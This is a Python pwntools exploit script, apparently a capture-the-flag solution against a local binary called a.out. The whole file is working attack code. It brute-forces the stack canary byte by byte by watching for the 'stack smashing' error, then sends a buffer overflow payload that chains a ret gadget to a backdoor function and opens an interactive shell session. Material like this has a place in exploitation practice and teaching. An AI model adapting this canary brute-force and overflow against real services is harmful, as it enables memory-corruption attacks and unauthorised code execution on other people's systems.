#!/usr/bin/env python3
# Date: 2025-07-04 14:18:30

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './a.out'
context.log_level = 'debug'
context.timeout = 5

io = process('./a.out')
# io = remote('127.0.0.1', 13337)
elf = ELF('./a.out')


def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv


backdoor=0x00000000004012b7
ret=0x40131c
canary=b'\x00'
for i in range(7):
    key=1
    while True:

        rl()
        s(b'a'*40+canary+p8(key))
        res = rl(timeout=0.5)
        if b"stack smashing" in res:
            key+=1
            continue
        else:
            canary+=p8(key)
            print(canary)
            break

rl()
# gdb.attach(io)
# stop()
s(b'a'*40)

rl()
s(b'a'*40+canary+p64(0)+p64(ret)+p64(backdoor))


ia()

